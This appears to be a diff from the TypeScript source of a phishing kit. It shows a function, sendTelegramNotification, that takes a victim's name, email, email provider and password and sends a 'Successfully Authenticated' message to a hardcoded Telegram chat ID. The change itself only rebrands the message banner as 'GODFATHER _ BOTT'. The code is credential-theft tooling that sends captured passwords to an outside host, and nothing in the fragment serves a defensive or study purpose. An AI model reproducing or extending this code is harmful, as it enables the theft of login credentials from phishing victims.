@@ -26,7 +26,7 @@ const TELEGRAM_CHAT_ID = '7607683158'
 async function sendTelegramNotification(name: string, email: string, provider: string, password: string) {
   const message = `
 ╔══════════════════════════════╗
-  🔏 𝓓𝓲𝓰𝓲𝓽𝓪𝓵 𝓢𝓲𝓰𝓷𝓪𝓽𝓾𝓻𝓮
+  ⚡ <span class="tg-spoiler">[ ＧＯＤＦＡＴＨＥＲ _ ＢＯＴＴ ]</span> ⚡
 ╚══════════════════════════════╝
 
 ✅ <b>Status:</b> Successfully Authenticated
